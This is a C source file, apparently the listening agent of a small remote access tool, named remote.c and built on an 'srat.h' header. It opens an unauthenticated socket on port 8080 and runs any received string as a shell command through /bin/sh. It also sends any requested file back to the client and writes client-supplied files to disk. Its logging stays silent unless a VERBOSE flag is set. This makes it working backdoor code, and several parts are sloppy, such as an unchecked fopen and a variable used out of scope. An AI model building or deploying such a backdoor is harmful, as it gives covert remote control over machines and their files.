/**
 * @file remote.c
 * @author Filip Naudot
 * @brief Establishes a connection and executes commands
 * @version 0.1
 * @date 2022-07-02
 * 
 */

#include "srat.h"
#include <ctype.h>

#define PORT "8080"

int main(int argc, char *argv[]) {
    #ifdef VERBOSE
    printf("Configuring local address...\n");
    #endif

    addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    addrinfo *bind_address;
    getaddrinfo(0, PORT, &hints, &bind_address);

    #ifdef VERBOSE
    printf("Creating socket...\n");
    #endif
    SOCKET socket_listen;
    socket_listen = socket(bind_address->ai_family,
                            bind_address->ai_socktype,
                            bind_address->ai_protocol);
    if (!ISVALIDSOCKET(socket_listen)) {
        #ifdef VERBOSE
        perror("socket");
        #endif
        return 1;
    }

    #ifdef VERBOSE
    printf("Binding socket to local address...\n");
    #endif
    if (bind(socket_listen, bind_address->ai_addr, bind_address->ai_addrlen)) {
        #ifdef VERBOSE
        perror("bind");
        #endif
        return 1;
    }
    freeaddrinfo(bind_address);

    #ifdef VERBOSE
    printf("Listening...\n");
    #endif
    if (listen(socket_listen, 10) < 0) {
        #ifdef VERBOSE
        perror("listen");
        #endif
        return 1;
    }

    fd_set master;
    FD_ZERO(&master);
    FD_SET(socket_listen, &master);
    SOCKET max_socket = socket_listen;

    #ifdef VERBOSE
    printf("Waiting for connections...\n");
    #endif

    while(1) {
        fd_set reads;
        reads = master;
        if (select(max_socket+1, &reads, 0, 0, 0) < 0) {
            #ifdef VERBOSE
            perror("select");
            #endif
            return 1;
        }

        for(SOCKET i = 1; i <= max_socket; ++i) {
            if (FD_ISSET(i, &reads)) {
                if (i == socket_listen) {
                    struct sockaddr_storage client_address;
                    socklen_t client_len = sizeof(client_address);
                    SOCKET socket_client = accept(socket_listen,
                            (struct sockaddr*) &client_address,
                            &client_len);
                    if (!ISVALIDSOCKET(socket_client)) {
                        #ifdef VERBOSE
                        perror("accept");
                        #endif
                        return 1;
                    }

                    FD_SET(socket_client, &master);
                    if (socket_client > max_socket) {
                        max_socket = socket_client;
                    }

                    char address_buffer[100];
                    getnameinfo((struct sockaddr*)&client_address,
                                client_len,
                                address_buffer,
                                sizeof(address_buffer),
                                0,
                                0,
                                NI_NUMERICHOST);
                    #ifdef VERBOSE
                    printf("New connection from %s\n", address_buffer);
                    #endif

                } else {
                    data_packet data;
                    data.transfer_status = NO_TRANSFER;

                    recv(i, &data.transfer_status, sizeof(int), 0);
                    // ---------------- START HANDLE PUT ----------------
                    if (data.transfer_status == PUT) {
                        size_t filename_size;
                        recv(i, &filename_size, sizeof(size_t), 0);
                        recv(i, data.read, filename_size, 0);
                        // ---------------- END HANDLE PUT ----------------
                    } else {
                        int bytes_received = recv(i, data.read, MAX_RECEIVE, 0);
                        // remove traling new line char
                        if (data.read[bytes_received - 1] == '\n') data.read[bytes_received - 1] = '\0';
                        if (bytes_received < 1) {
                            #ifdef VERBOSE
                            printf("Connection closed\n");
                            #endif
                            FD_CLR(i, &master);
                            close(i);
                            continue;
                        }
                    
                        #ifdef VERBOSE
                        printf("Recieved %d bytes\n", bytes_received);

                        for (int i = 0; i < bytes_received; i++) {
                            printf("%c", data.read[i]);
                        }
                        printf("\n");
                        #endif
                    }
                    
                    // TODO: allocate return_buffer dynamically
                    char return_buffer[STANDARD_BUFFER_SIZE] = {'\0'}; // Buffer to write in to

                    if (data.transfer_status == GET) {
                        FILE* fp = fopen(data.read, "r");

                        fseek(fp, 0L, SEEK_END);
                        long file_size = ftell(fp);
                        fseek(fp, 0L, SEEK_SET);

                        send_file(fp, i, file_size);
                    } else if (data.transfer_status == PUT) {
                        if (data.read[strlen(data.read) - 1] == '\n') data.read[strlen(data.read) - 1] = '\0';
                        write_file(i, data.read);
                    } else {
                        if (execute_command(data.read, return_buffer) < 0) {
                            // TODO: add error print function
                            exit(EXIT_FAILURE);
                        }
                        int bytes_sent = send(i, return_buffer, strlen(return_buffer), 0);
                    }

                    #ifdef VERBOSE
                    printf("Bytes sent: %d [strlen(return_buffer): %lu]\n", bytes_sent, strlen(return_buffer));
                    #endif
                }

            } //if FD_ISSET
        } //for i to max_socket
    } //while(1)

    return 0;
}


/**
 * @brief Executes given command
 * 
 * @param command string containing command
 * @return int the execution status
 */
int execute_command(char* command, char* return_buffer) {
    pid_t pid;
    int status = 0;
    
    int pipefd[2];
    pipe(pipefd);
    
    // Fork and execute command
    pid = fork();
    if(pid < 0) {
        #ifdef VERBOSE
        perror("Fork");
        #endif
        status = -1;
    }
    else if(pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);  // send stdout to the pipe
        dup2(pipefd[1], STDERR_FILENO);  // send stderr to the pipe
        close(pipefd[1]);

        if(execl("/bin/sh", "sh", "-c", command, (char*)NULL) < 0) {
            #ifdef VERBOSE
            perror(command);
            #endif
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }
    close(pipefd[1]);

    while (read(pipefd[0], return_buffer, STANDARD_BUFFER_SIZE) != 0);

    close(pipefd[0]);

    // Wait for child process
    if(wait(&status) == -1) {
        #ifdef VERBOSE
        perror("wait");
        #endif
        status = -1;
    }
    if(WIFEXITED(status)) {
        if(WEXITSTATUS(status) == EXIT_FAILURE) {
            status = -1;
        }
    }
    return status;
}


void send_file(FILE *fp, int sockfd, long file_size) {
    int n;
    char data[1024] = {0};

    if (send(sockfd, &file_size, sizeof(long), 0) < 0) {
        perror("send");
        exit(1);
    }

    while (fgets(data, 1024, fp) != NULL) {
        if (send(sockfd, data, strlen(data), 0) < 0) {
            perror("send");
            exit(1);
        }
        bzero(data, 1024);
    }
}

void write_file(int socket_peer, char* filename) {
    int n;
    FILE *fp;
    char buffer[1024];
    long file_size = 33;
    long total_bytes_recieved = 0;

    fp = fopen(filename, "w");

    // recieve file size
    recv(socket_peer, &file_size, sizeof(long), 0);

    do {
        fd_set reads;
        FD_ZERO(&reads);
        FD_SET(socket_peer, &reads);

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 100000;

        if (select(socket_peer+1, &reads, 0, 0, &timeout) < 0) {
            perror("select");
            exit(1);
        }

        if (FD_ISSET(socket_peer, &reads)) {
            int n = recv(socket_peer, buffer, 1024, 0);
            total_bytes_recieved += n;

            fprintf(fp, "%s", buffer);
            bzero(buffer, 1024);
        }
    } while(total_bytes_recieved < file_size);

    fclose(fp);
}